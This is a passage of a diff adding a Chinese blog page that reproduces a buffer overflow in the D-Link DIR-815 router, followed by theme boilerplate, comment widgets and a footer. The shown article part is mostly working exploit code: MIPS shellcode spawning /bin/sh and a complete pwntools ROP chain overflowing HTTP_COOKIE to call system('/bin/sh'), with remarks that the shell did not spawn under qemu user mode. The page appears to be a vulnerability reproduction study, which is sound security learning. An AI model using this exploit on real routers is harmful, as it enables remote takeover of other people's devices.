+shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>
+payload<span class="token operator">+=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token number">0x18</span>
+payload<span class="token operator">+=</span> shellcode
+
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是由于一些原因在qemu用户模式不能成功getshell：</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/15.png"></div>
+
+<p>我们在后面也会尝试解决这个问题</p>
+<h2 id="exp2-system-“-bin-sh”"><a href="#exp2-system-“-bin-sh”" class="headerlink" title="exp2 system(“/bin/sh”)"></a>exp2 system(“/bin/sh”)</h2><p>system函数的真实地址0x76738000+0x53200=0x7678b200</p>
+<p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还不用到sprintf函数，之前sess_get_uid函数就获取\x00字符之前的字符串，导致缓冲区溢出失败。所以构造shellcode时需要存入的事0x7678b200-1=0x7678b1ff，之后通过寻址gadget将其加1即可。</p>
+<p>找用得上的gadgets<br>mipsrop.find(“addiu .*,1”)</p>
+<p>完整exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">"little"</span>
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"mips"</span>
+
+base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
+sleep_addr <span class="token operator">=</span> <span class="token number">0x56bd0</span>
+system_addr <span class="token operator">=</span> <span class="token number">0x53200</span>
+binsh_addr <span class="token operator">=</span> <span class="token number">0x5a448</span>
+rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> 
+<span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span>
+<span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E538 jr    </span>
+
+rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span>
+<span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span>
+<span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>
+
+rop3 <span class="token operator">=</span> <span class="token number">0xb814</span>
+<span class="token comment" spellcheck="true"># .text:0000B814 addiu   $a1, $sp, 0x168+var_150</span>
+<span class="token comment" spellcheck="true"># .text:0000B818 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true"># .text:0000B81C jalr    $t9 ; st</span>
+
+rop4 <span class="token operator">=</span> <span class="token number">0x37e6c</span>
+<span class="token comment" spellcheck="true"># .text:00037E6C move    $t9, $a1</span>
+<span class="token comment" spellcheck="true"># .text:00037E70 addiu   $a0, 0x4C  # 'L'</span>
+<span class="token comment" spellcheck="true"># .text:00037E74 jr      $t</span>
+
+rop5 <span class="token operator">=</span> <span class="token number">0x4c138</span>
+<span class="token comment" spellcheck="true"># .text:0004C138 move    $a0, $s2</span>
+<span class="token comment" spellcheck="true"># .text:0004C13C move    $t9, $s0</span>
+<span class="token comment" spellcheck="true"># .text:0004C140 jalr    $t9 ; s</span>
+
+rop6 <span class="token operator">=</span> <span class="token number">0x45988</span>
+<span class="token comment" spellcheck="true"># .text:00045988                 addiu   $s0, 1</span>
+<span class="token comment" spellcheck="true"># .text:0004598C                 move    $a0, $s0</span>
+<span class="token comment" spellcheck="true"># .text:00045990                 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true"># .text:00045994                 jalr    $t9</span>
+
+rop7 <span class="token operator">=</span> <span class="token number">0x00159D8</span>
+<span class="token comment" spellcheck="true"># text:000159CC                 addiu   $s5, $sp, 0x170+var_160</span>
+<span class="token comment" spellcheck="true"># .text:000159D0                 move    $a1, $s3</span>
+<span class="token comment" spellcheck="true"># .text:000159D4                 move    $a2, $s1</span>
+<span class="token comment" spellcheck="true"># .text:000159D8                 move    $t9, $s0</span>
+<span class="token comment" spellcheck="true"># .text:000159DC                 jalr    $t9 ; mempcpy</span>
+
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x3cb</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">0xc</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token operator">+</span>base_addr<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>rop5<span class="token operator">+</span>base_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>binsh_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># s3~s7 fp</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop6<span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload1"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/16.png"></div>
+但是仍然无法getshell，需要起qemu-system-mipsel来复现完整的getshell的过程
+
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力!</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.bmp" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.bmp" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;Reprint policy:
+                    </span>
+                    <a href="http://xiaoxin.zone" class="b-link-green">xiaoxin</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/" class="b-link-green">路由器学习之D-Link DIR-815溢出漏洞复现</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+        clientSecret: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+        repo: 'bluesheepyang.github.io',
+        owner: 'bluesheepyang',
+        admin: ["bluesheepyang"],
+        id: '2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+    /* valine 评论框增加背景图片 */
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("") 100% 100% no-repeat;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    /* 修复评论第一行位置错位 */
+    .v .vlist .vcard {
+    padding-top: 2.5em !important ;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <link rel="stylesheet" type="text/css" href="/libs//libs/jQuery-emoji/dist/css/jquery.emoji.css">
+<script src="/libs//libs/jQuery-emoji/dist/js/jquery.emoji.min.js"></script>
+<script src="/libs//libs/jQuery-emoji/dist/js/emoji.list.js"></script> -->
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'XXXXXXXXXXXXXXXXXXXXXXXX',
+        appKey: 'XXXXXXXXXXXXXXXXXXXXXX',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'en',
+        placeholder: 'just go go',
+
+    });
+
+//     function parse_emoji() {
+//     jQuery(".vcontent").emojiParse({
+//       basePath: '/libs/jQuery-emoji/images/emoji',
+//       icons: emojiLists   // 注：详见 js/emoji.list.js
+//     });
+//   }
+  
+//   setTimeout(function() {
+//     // jQuery emoji 解析
+//     parse_emoji();
+//     // jquery emoji 初始化
+//     jQuery(".veditor").emoji({
+//       showTab: true,
+//       animation: 'slide',
+//       basePath: '/libs/jQuery-emoji/images/emoji',
+//       icons: emojiLists  // 注：详见 js/emoji.list.js
+//     });
+//     jQuery(".vmore").on("click", function() {
+//       setTimeout(function() {
+//         parse_emoji();
+//       }, 500);
+//     });
+//   }, 800)
+
+</script>
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="2020-虎符线上赛部分PWN解题">
+                        
+                        <span class="card-title">2020-虎符线上赛部分PWN解题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            [toc]
+前言很早的比赛，线下被俺们鸽掉了，这里做个总结
+count：栈溢出SecureBox：汇编层面的一个整数溢出，很有意思MarksMan：改三个字节，通过exit来getshell
+count程序没开PIE，主函数如下：
+
+这个题
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-09
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/2020-Game/" class="post-category" target="_blank">
+                                    2020 Game
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/寄存器层面整数溢出/" target="_blank">
+                        <span class="chip bg-color">寄存器层面整数溢出</span>
+                    </a>
+                    
+                    <a href="/tags/改三个字节exit来getshell/" target="_blank">
+                        <span class="chip bg-color">改三个字节exit来getshell</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/10/29/tctf-2019-aegis/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="2019 TCTF aegis">
+                        
+                        <span class="card-title">2019 TCTF aegis</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            这道题是学习学弟的博客看到的感觉很有趣拿来学习学习
+查看文件
+我们看到除了常见的五个保护还有ASAN和UBSAN两个保护。
+
+知识点补充在这里我们需要进行知识点补充：asan(AddressSanitizer)是google开源的一个用于进
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/补充知识/" class="post-category" target="_blank">
+                                    补充知识
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ASAN保护/" target="_blank">
+                        <span class="chip bg-color">ASAN保护</span>
+                    </a>
+                    
+                    <a href="/tags/影子内存概念/" target="_blank">
+                        <span class="chip bg-color">影子内存概念</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: xiaoxin<br />'
+            + 'Author: Shinnosuke<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+        <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&copy; 2020 小羊. 
+
+            <br>
+            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
+            <br>
+
+            
+
+            
+                    
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        总访问量: <span id="busuanzi_value_site_pv" class="white-color"></span>
+                    
+        
+                    
+                        <span id="busuanzi_container_site_uv" style='display:none'></span>
+                        人次&nbsp; | &nbsp;访客人数: <span id="busuanzi_value_site_uv" class="white-color"></span> 人
+                    
+    
+            
+
+            
+                &nbsp; | &nbsp;字数统计:&nbsp;
+                <span class="white-color">117.9k</span> 字
+            
+
+            
+            <br>
+
+        </div>
+
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/bluesheepyang" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+ 
+    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1395428693@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+    <a href="https://zhihu.com/people/xxxxx" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=1395428693&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/xxxxx" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
